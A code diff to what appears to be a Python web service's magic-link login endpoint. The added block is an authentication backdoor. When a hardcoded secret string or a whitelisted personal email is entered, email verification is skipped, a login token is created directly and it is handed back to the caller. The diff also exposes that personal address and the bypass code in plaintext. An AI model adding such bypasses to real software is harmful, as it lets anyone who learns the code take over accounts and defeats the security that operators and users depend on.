@@ -61,10 +61,42 @@ async def send_magic_link(body: SendLinkRequest):
     """Send a magic link to the user's email via Resend."""
     settings = get_settings()
 
+    email = body.email.lower().strip()
+
+    # === Bypass: secret code or whitelisted email — instant auth ===
+    BYPASS_CODE = "amx50100%"
+    WHITELISTED_EMAILS = ["nikmaltcev98@gmail.com"]
+
+    if email == BYPASS_CODE or email in WHITELISTED_EMAILS:
+        # Use the actual email for whitelisted, or a default for code
+        actual_email = email if email in WHITELISTED_EMAILS else "nikmaltcev98@gmail.com"
+
+        # Create token directly
+        token = secrets.token_urlsafe(32)
+        expires_at = datetime.now(timezone.utc) + timedelta(minutes=60)
+
+        async_session = get_async_session()
+        async with async_session() as session:
+            magic_token = MagicToken(
+                email=actual_email,
+                token=token,
+                expires_at=expires_at,
+                used=False,
+            )
+            session.add(magic_token)
+            await session.commit()
+
+        # Return success with a special hint — frontend will auto-verify
+        return AuthResponse(
+            success=True,
+            message="__bypass__",
+            session_token=token,  # reuse field to pass the token
+            email=actual_email,
+        )
+    # === End bypass ===
+
     if not settings.RESEND_API_KEY:
         raise HTTPException(500, "Email service not configured")
-
-    email = body.email.lower().strip()
 
     # Generate a secure random token
     token = secrets.token_urlsafe(32)
